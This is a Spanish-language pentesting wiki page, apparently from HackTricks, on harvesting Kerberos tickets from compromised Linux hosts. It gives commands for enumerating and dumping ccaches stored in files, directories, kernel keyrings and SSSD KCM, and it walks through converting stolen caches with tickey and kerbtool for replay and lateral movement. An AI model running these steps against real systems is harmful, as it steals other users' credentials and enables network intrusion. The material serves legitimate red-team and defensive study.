# Recolección de tickets desde Linux

{{#include ../../banners/hacktricks-training.md}}

### Almacenamiento de credenciales en Linux

Los sistemas Linux almacenan credenciales en tres tipos de cachés, a saber: **Files** (en el directorio `/tmp`), **Kernel Keyrings** (un segmento especial en el kernel de Linux) y **Process Memory** (para uso por un solo proceso). La variable default_ccache_name en `/etc/krb5.conf` revela el tipo de almacenamiento en uso, por defecto `FILE:/tmp/krb5cc_%{uid}` si no se especifica.

MIT/Heimdal también soportan backends adicionales que deberías buscar durante la post-exploitation:

- `DIR:/run/user/%{uid}/krb5cc` para cachés multi-ticket respaldadas por directorio (systemd-logind por defecto en distribuciones modernas).
- `KEYRING:persistent:%{uid}` o `KEYRING:session` para almacenar ccaches dentro del kernel keyring (`KEY_SPEC_SESSION_KEYRING`, `KEY_SPEC_USER_KEYRING`, etc.).
- `KCM:%{uid}` cuando el Kerberos Cache Manager daemon de SSSD (kcm) gestiona el almacenamiento de tickets.
- `MEMORY:unique_id` para cachés locales de proceso creadas por librerías (`gssproxy`, `sshd`, etc.).

Siempre que obtengas un shell, extrae KRB5CCNAME desde `/proc/<pid>/environ` de daemons interesantes (p. ej., Apache, sshd, gssproxy) para saber qué backend de caché se está usando antes de empezar a copiar archivos.

### Enumerar las cachés activas

Enumera las cachés antes de la extracción para evitar perder tickets de alto valor:
```bash
$ klist -l            # list caches registered in the local keyring/KCM
$ klist -A            # show all ticket-granting tickets in the current cache
$ sudo keyctl get_persistent @u
$ sudo keyctl show `keyctl get_persistent @u`
$ sudo ls -al /tmp/krb5cc_* /run/user/*/krb5cc*
$ sudo find /proc -maxdepth 2 -name environ -exec sh -c 'tr "\0" "\n" < {} | grep -H KRB5' \;
```
La combinación de `klist`, `keyctl` y la inspección de `/proc` revela rápidamente si las credenciales viven en archivos, keyrings o KCM, para que puedas elegir la técnica de dumping adecuada.

### Extracción de credenciales

El artículo de 2017, [**Kerberos Credential Thievery (GNU/Linux)**](https://www.delaat.net/rp/2016-2017/p97/report.pdf), describe métodos para extraer credenciales de keyrings y procesos, enfatizando el mecanismo de keyring del kernel de Linux para gestionar y almacenar claves.

#### Resumen de extracción de keyrings

La **keyctl system call**, introducida en la versión del kernel 2.6.10, permite a las aplicaciones en espacio de usuario interactuar con los keyrings del kernel. Las credenciales en keyrings se almacenan como componentes (principal predeterminado y credenciales), distintos de los ccaches de archivo que también incluyen un encabezado. El **hercules.sh script** del artículo demuestra cómo extraer y reconstruir estos componentes en un ccache de archivo usable para el robo de credenciales. Recuerda que los ccaches almacenados en keyrings pueden residir bajo `KEYRING:persistent:%{uid}` (permanente entre inicios de sesión), `KEYRING:session` (se borra al cerrar sesión), o incluso `KEY_SPEC_THREAD_KEYRING` para servicios que generan hilos auxiliares — así que siempre enumera todos los tipos de keyring para el UID comprometido.

#### Flujo de trabajo manual de KEYRING

Puedes recolectar tickets manualmente sin scripts auxiliares siempre que `default_ccache_name` esté establecido en `KEYRING:`:
```bash
$ KRING=$(keyctl get_persistent @u)
$ keyctl show $KRING                       # note the key serial of each ccache blob
$ keyctl pipe <serial> > /tmp/ccache_dump  # write raw blob to disk
$ KRB5CCNAME=/tmp/ccache_dump klist        # validate the stolen cache
```
If multiple principals are stored, repeat the `keyctl pipe` step per serial, then convert the extracted ccache to a Windows-friendly `.kirbi`/`.ccache` using tooling such as `kerbtool` (see below) or `ticketConverter.py` before replaying it from other machines.

#### Ganancias rápidas al robar cachés File/DIR

Cuando las credenciales se almacenan como caches `FILE:` o `DIR:`, operaciones de archivo simples suelen ser suficientes:
```bash
$ sudo cp /tmp/krb5cc_1000 /tmp/websvc.ccache
$ sudo cp -r /run/user/1000/krb5cc /tmp/user1000_dircc
$ chmod 600 /tmp/*.ccache && chown attacker /tmp/*.ccache
```
Los caches de directorio contienen un archivo por ticket de servicio, así que comprime y exfiltra todo el directorio para mantener intactos los pares TGT + TGS. También puedes apuntar tus herramientas directamente al directorio: `KRB5CCNAME=DIR:/tmp/user1000_dircc impacket-psexec ...`.

#### Volcado de caches gestionados por KCM

El Kerberos Cache Manager (kcm) de SSSD actúa como proxy del almacenamiento de credenciales a través de `/var/run/kcm/kcmsock` (o `/run/.heim_org.h5l.kcm-socket`) y persiste blobs cifrados dentro de `/var/lib/sss/secrets/` junto con `.secrets.mkey`. Flujo de ataque:

1. Identifica el uso de KCM mediante `/etc/krb5.conf` (`default_ccache_name = KCM:`) o la salida de `klist -l`.
2. Si tienes UID 0 o formas parte del dominio SELinux `kcm`, enumera las caches mediante la herramienta de gestión:
```bash
$ sudo kcm_ctl list                 # lists UID + cache IDs handled by kcm
$ sudo kcm_ctl get 1000 0 > /tmp/1000.kcm.ccache
$ KRB5CCNAME=/tmp/1000.kcm.ccache klist
```
3. Enfoque offline: copia `/var/lib/sss/secrets/secrets.ldb` y `/var/lib/sss/secrets/.secrets.mkey`, luego ejecuta `SSSDKCMExtractor` (u otros PoCs similares) para descifrar y reensamblar ccaches sin tocar el socket en vivo. Esto es especialmente útil en forensics o cuando las socket ACLs te bloquean pero es posible el acceso al disco.

Porque el kcm daemon respeta las UID-based ACLs aplicadas por SSSD, normalmente se requiere privilege escalation a root (o comprometer `sssd_kcm`), pero una vez conseguido puedes volcar el TGT de cada usuario en segundos.

### Herramientas para extracción de tickets

Automatizar los pasos anteriores reduce errores y te proporciona material de tickets cross-platform que puedes reproducir con Windows tooling.

#### Tickey

Basado en los principios del **hercules.sh script**, la herramienta [**tickey**](https://github.com/TarlogicSecurity/tickey) está diseñada específicamente para extraer tickets desde keyrings, ejecutándose vía `/tmp/tickey -i`. Enumera kernel keyrings, reconstruye los ccaches serializados y escribe archivos de caché compatibles con MIT que puedes alimentar inmediatamente a `klist`, `impacket-*`, o `kerberoast` tooling.

#### Kerbtool

[**kerbtool**](https://github.com/jfjallid/kerbtool) es una utilidad moderna en Go que se ejecuta nativamente en Linux y puede parsear, convertir y solicitar Kerberos tickets. Dos casos de uso prácticos cuando harvesting desde Linux boxes:
```bash
# Convert a stolen MIT ccache into a .kirbi usable by Windows tooling
$ ./kerbtool --convert --in /tmp/websvc.ccache --out websvc.kirbi

# Use an extracted cache to request additional TGS tickets without touching the victim again
$ KRB5CCNAME=/tmp/websvc.ccache ./kerbtool --ask --spn cifs/fileserver.lab.local
```
Tener tanto tickey como kerbtool en tu implant host te permite moverte sin problemas entre Linux, Windows y cadenas de ataque Kerberos multiplataforma.

## Referencias

- [**https://www.tarlogic.com/en/blog/how-to-attack-kerberos/**](https://www.tarlogic.com/en/blog/how-to-attack-kerberos/)
- [**https://docs.pagure.org/sssd.sssd/design_pages/kcm.html**](https://docs.pagure.org/sssd.sssd/design_pages/kcm.html)
- [**https://github.com/jfjallid/kerbtool**](https://github.com/jfjallid/kerbtool)

{{#include ../../banners/hacktricks-training.md}}
